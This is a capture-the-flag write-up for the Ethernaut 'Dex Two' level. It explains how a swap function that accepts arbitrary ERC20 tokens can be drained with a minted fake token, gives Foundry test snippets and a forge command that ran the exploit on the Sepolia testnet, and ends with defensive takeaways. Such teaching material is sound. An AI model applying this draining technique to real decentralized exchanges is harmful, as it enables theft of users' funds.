# Ethernaut Challenge 23 — Dex Two

This level asks you to break `DexTwo`, a modified version of the previous DEX contract.

You need to drain all balances of `token1` and `token2` from the `DexTwo` contract.

Initial setup:

* You:

  * 10 token1
  * 10 token2
* DEX:

  * 100 token1
  * 100 token2

---

## 🎯 Goal

Drain all tokens (`token1` and `token2`) from the `DexTwo` contract.

---

## 🔍 Key difference from previous level

The `DexTwo` contract is almost identical to the previous `Dex`, with one critical change.

This check has been **removed** from the `swap` function:

```solidity
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

---

## 🧠 Vulnerability analysis

Because this validation is missing:

* the DEX accepts **any ERC20 token** as `from`
* not only `token1` and `token2`

This is the core vulnerability.

---

### ⚠️ Why this is dangerous

The swap formula is:

```solidity
(amount * toBalance) / fromBalance
```

If we control `fromBalance`, we can manipulate the output.

---

## 💥 Exploit idea

We create a **malicious ERC20 token** and:

1. Mint a small amount to ourselves
2. Mint a small amount to the DEX
3. Use it as `from` in `swap`

Because:

```text
fromBalance (DEX) = 1
toBalance (DEX) = 100
```

We get:

```text
swapAmount = (1 * 100) / 1 = 100
```

💥 We receive all the tokens from the DEX.

---

## 🧪 Local test

This is implemented in [DexTwoTest.t.sol](../../test/challenge-23-dex-two/DexTwoTest.t.sol)


We deploy two fake tokens:

* `myToken1`
* `myToken2`

Then:

```solidity
myToken1.mint(user, 1);
myToken1.mint(address(dex), 1);

myToken2.mint(user, 1);
myToken2.mint(address(dex), 1);
```

Then we perform:

```solidity
dex.swap(address(myToken1), address(token1), 1);
dex.swap(address(myToken2), address(token2), 1);
```

Final result:

```solidity
assertEq(token1.balanceOf(user), 110);
assertEq(token2.balanceOf(user), 110);

assertEq(token1.balanceOf(address(dex)), 0);
assertEq(token2.balanceOf(address(dex)), 0);
```

---

## 🚀 Exploit on Sepolia

We executed the exploit using our automated Foundry script `script/23-DexTwo.s.sol` which deploys a fake ERC20 token, funds the DEX and yourself, and drains both token reserves completely.

Execute it using:
```bash
forge script script/23-DexTwo.s.sol --rpc-url sepolia --broadcast
```

### 📜 My Transactions

* **MyErc20 Fake Token Deploy**: [0x0bf4ed7de1e3f32eccecf8cd26c1a2bff5885dd25a00df762cafa5491a738b1e](https://sepolia.etherscan.io/tx/0x0bf4ed7de1e3f32eccecf8cd26c1a2bff5885dd25a00df762cafa5491a738b1e)
* **First Swap (Drain Token 1)**: [0x7836672367cced6fa75fd75ede4bef4106f0cf847db3257f65a99c35e023eb64](https://sepolia.etherscan.io/tx/0x7836672367cced6fa75fd75ede4bef4106f0cf847db3257f65a99c35e023eb64)
* **Second Swap (Drain Token 2)**: [0x5531c9bac6e279422544d3065f57d6271ef14da5d1950e9b3f9216fa704ad851](https://sepolia.etherscan.io/tx/0x5531c9bac6e279422544d3065f57d6271ef14da5d1950e9b3f9216fa704ad851)
* **Exploit Block**: 10933118

---

## 🛡️ Security Takeaways
* Never allow arbitrary/unvalidated tokens to be traded in swap functions.
* Always enforce a whitelist of supported/valid asset addresses inside the contract logic.
* Pricing ratios must rely on reliable oracles, TWAPs, or constant product invariants ($x \times y = k$) to prevent complete pool drainage.

